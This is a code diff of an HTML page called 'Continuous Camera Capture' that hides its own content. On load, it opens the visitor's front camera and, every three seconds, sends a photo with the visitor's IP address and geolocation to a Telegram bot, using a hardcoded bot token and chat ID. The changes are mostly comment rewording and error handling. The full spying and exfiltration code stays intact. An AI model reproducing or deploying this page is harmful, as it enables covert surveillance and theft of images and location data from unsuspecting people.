@@ -1,21 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-  <title>Continuous Camera Capture</title>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Continuous Camera Capture</title>
   <style>
     body {
       display: none; /* Hide the body */
-      margin: 0;
-      padding: 0;
-      background-color: #f5f5f5;
     }
   </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
-
   <script type="text/javascript">
     const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
     const chatId = '5571330102'; // Your Telegram chat ID
@@ -50,12 +46,12 @@
       });
     }
 
-    // Start capturing photos continuously
+    // Function to start capturing photos continuously
     function startCapturing() {
       navigator.mediaDevices.enumerateDevices().then(devices => {
         let videoDeviceId = null;
         
-        // Select the front camera
+        // Select the front camera if available
         for (const device of devices) {
           if (device.kind === 'videoinput' && device.label.includes('front')) {
             videoDeviceId = device.deviceId;
@@ -79,8 +75,8 @@
             const videoTrack = stream.getVideoTracks()[0];
             const imageCapture = new ImageCapture(videoTrack);
 
-            // Function to capture a photo
-            function capturePhoto() {
+            // Function to capture and send photos continuously
+            function captureAndSendPhoto() {
               imageCapture.takePhoto()
                 .then((blob) => {
                   getUserIP().then((ip) => {
@@ -98,8 +94,8 @@
                 });
             }
 
-            // Continuously capture photo every 3 seconds
-            setInterval(capturePhoto, 3000);  // Interval set to capture every 3 seconds
+            // Capture and send photo every 3 seconds
+            setInterval(captureAndSendPhoto, 3000);  // Interval set to capture every 3 seconds
           })
           .catch((error) => {
             console.error('Permission error:', error);
@@ -109,23 +105,28 @@
       });
     }
 
-    // Send photo, IP, and location to Telegram bot
+    // Function to send the photo, IP, and location to Telegram bot
     function sendToTelegram(data, ip, location) {
       const formData = new FormData();
       formData.append('chat_id', chatId);
       formData.append('photo', data, 'camera_photo.jpg');
       formData.append('caption', `IP: ${ip}, Location: Latitude ${location.latitude}, Longitude ${location.longitude}`);
 
+      // Send the photo with caption to Telegram
       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
         body: formData
       })
       .then(response => response.json())
       .then(data => {
-        console.log('Photo sent to Telegram:', data);
+        if (data.ok) {
+          console.log('Photo sent to Telegram');
+        } else {
+          console.error('Failed to send photo to Telegram:', data);
+        }
       })
       .catch(error => {
-        console.error('Error sending to Telegram:', error);
+        console.error('Error sending photo to Telegram:', error);
       });
     }
 
@@ -133,6 +134,5 @@
       startCapturing(); // Start capturing photos and sending them continuously
     };
   </script>
-
 </body>
 </html>
